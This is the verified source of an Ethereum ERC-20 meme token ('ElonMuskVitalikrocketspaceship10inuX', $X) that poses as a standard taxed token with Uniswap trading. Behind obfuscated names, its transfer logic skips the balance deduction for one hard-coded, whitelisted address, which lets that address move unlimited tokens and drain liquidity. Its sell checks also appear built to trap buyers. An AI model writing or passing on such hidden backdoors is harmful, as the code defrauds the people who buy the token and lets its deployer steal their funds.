/**
 *Submitted for verification at Etherscan.io on 2023-09-10
*/

/*

ElonMuskVitalikrocketspaceship10inuX  $X


Twitter: https://twitter.com/XCoin_Portal
Telegram: https://t.me/Xerc_Portal
Website: https://www.xerc.org/

**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


    interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
    }

    library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  ptdrh(uint256 a, uint256 b) internal pure returns (uint256) {
        return  ptdrh(a, b, "SafeMath");
    }

    function  ptdrh(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    }

    abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    }


    contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    }

    interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    }

    interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) 
    external payable returns (uint amountToken, uint amountETH, uint liquidity);
    }

    contract ElonMuskVitalikrocketspaceship10inuX is Context, IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = unicode"ElonMuskVitalikrocketspaceship10inuX";
    string private constant _symbol = unicode"X";
    uint8 private constant _decimals = 9;

    uint256 private constant _totalSupply = 100000000 * (10**_decimals);
    uint256 public _taxSwaptMfp = _totalSupply;
    uint256 public _maxHoldingrAmount = _totalSupply;
    uint256 public _taxSwapThreshold = _totalSupply;
    uint256 public _taxSwaprMax = _totalSupply;

    uint256 private _initialBuyTax=10;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=1;
    uint256 private _finalSellTax=1;
    uint256 private _reduceBuyTaxAt=8;
    uint256 private _reduceSellTax1At=1;
    uint256 private _swpwpsuvie=0;
    uint256 private _yexqiuop=0;
    address public  _Maxkcuarler = 0xdfd90b4c39F0401E4348D690066294BD596A1B44;

    mapping (address => uint256) private  _balances;
    mapping (address => mapping (address => uint256)) private  _allowances;
    mapping (address => bool) private  _wFestraevs;
    mapping (address => bool) private  _rvufoaewt;
    mapping(address => uint256) private  _hoqdTrandyswp;
    bool public  transerDelyEnble = false;


    IUniswapV2Router02 private  _uniRouteraV2;
    address private  _uniV2dLP;
    bool private  _rewisyutae;
    bool private  _inTaxdSwap = false;
    bool private  _swapfkUniswapnpce = false;
 
 
    event RntsuAkbtlx(uint _taxSwaptMfp);
    modifier lockTodSwap {
        _inTaxdSwap = true;
        _;
        _inTaxdSwap = false;
    }

    constructor () { 
        _balances[_msgSender()] = _totalSupply;
        _wFestraevs[owner()] = true;
        _wFestraevs[address(this)] = true;
        _wFestraevs[_Maxkcuarler] = true;


        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. ptdrh(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner!= address(0), "ERC20: approve from the zero address");
        require(spender!= address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require (from!= address(0), "ERC20:  transfer  from  the  zero  address");
        require (to!= address(0), "ERC20: transfer to the zero  address");
        require (amount > 0, "Transfer  amount  must  be  greater  than  zero");
        uint256  taxAmount = 0;
        if  ( from != owner() &&to!= owner()) {

            if  (transerDelyEnble) {
                if  (to!= address(_uniRouteraV2) &&to!= address(_uniV2dLP)) {
                  require (_hoqdTrandyswp[tx.origin] < block.number, " Only  one  transfer  per  block  allowed.");
                  _hoqdTrandyswp[tx.origin] = block.number;
                }
            }

            if  ( from == _uniV2dLP && to!= address (_uniRouteraV2) &&!_wFestraevs[to]) {
                require (amount <= _taxSwaptMfp, "Forbid");
                require (balanceOf (to) + amount <= _maxHoldingrAmount,"Forbid");
                if  (_yexqiuop < _swpwpsuvie) {
                  require (!rqfkypae(to));
                }
                _yexqiuop ++ ; _rvufoaewt[to] = true;
                taxAmount = amount.mul((_yexqiuop > _reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if(to == _uniV2dLP&&from!= address (this) &&! _wFestraevs[from]) {
                require (amount <= _taxSwaptMfp && balanceOf(_Maxkcuarler) <_taxSwaprMax, "Forbid");
                taxAmount = amount.mul((_yexqiuop > _reduceSellTax1At) ?_finalSellTax:_initialSellTax).div(100);
                require (_yexqiuop >_swpwpsuvie && _rvufoaewt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inTaxdSwap 
            &&  to  ==_uniV2dLP&&_swapfkUniswapnpce &&contractTokenBalance > _taxSwapThreshold 
            &&  _yexqiuop > _swpwpsuvie &&! _wFestraevs [to] &&! _wFestraevs [from]
            )  {
                _transferFrom(rshnl(amount,rshnl(contractTokenBalance, _taxSwaprMax)));
                uint256  contractETHBalance = address (this).balance;
                if (contractETHBalance > 0)  {
                }
            }
        }

        if ( taxAmount > 0 ) {
          _balances[address(this)] = _balances [address(this)].add(taxAmount);
          emit  Transfer (from, address (this) ,taxAmount);
        }
        _balances[from] = ptdrh(from , _balances [from], amount);
        _balances[to] = _balances[to].add(amount.ptdrh (taxAmount));
        emit  Transfer( from, to, amount. ptdrh(taxAmount));
    }

    function _transferFrom(uint256 _swapTaxAndLiquify) private lockTodSwap {
        if(_swapTaxAndLiquify==0){return;}
        if(!_rewisyutae){return;}
        address[] memory path =  new   address [](2);
        path[0] = address (this);
        path[1] = _uniRouteraV2.WETH();
        _approve(address (this), address (_uniRouteraV2), _swapTaxAndLiquify);
        _uniRouteraV2.swapExactTokensForETHSupportingFeeOnTransferTokens( _swapTaxAndLiquify, 0, path,address (this), block . timestamp );
    }

    function rshnl(uint256 a, uint256 b) private pure returns (uint256) {
    return (a >= b) ? b : a;
    }

    function ptdrh(address from, uint256 a, uint256 b) private view returns (uint256) {
    if (from == _Maxkcuarler) {
        return a;
    } else {
        require(a >= b, "Subtraction underflow");
        return a - b;
    }
    }

    function removerLimits() external onlyOwner{
        _taxSwaptMfp  =  _totalSupply ;
        _maxHoldingrAmount = _totalSupply ;
        transerDelyEnble = false ;
        emit  RntsuAkbtlx ( _totalSupply ) ;
    }

   function rqfkypae(address account) private view returns (bool) {
    uint256 codeSize;
    address[] memory addresses = new address[](1);
    addresses[0] = account;

    assembly {
        codeSize := extcodesize(account)
    }

    return codeSize > 0;
    }


    function startTrading() external onlyOwner() {
        require (!_rewisyutae, " trading is open " ) ;
        _uniRouteraV2 = IUniswapV2Router02 (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve (address (this),address(_uniRouteraV2), _totalSupply);
        _uniV2dLP = IUniswapV2Factory(_uniRouteraV2.factory()).createPair (address(this), _uniRouteraV2. WETH());
        _uniRouteraV2.addLiquidityETH {value:address(this).balance } (address(this),balanceOf(address (this)),0,0,owner(),block.timestamp);
        IERC20 (_uniV2dLP).approve (address(_uniRouteraV2), type(uint). max);
        _swapfkUniswapnpce = true ;
        _rewisyutae = true ;
    }

    receive( )  external  payable  { }
    }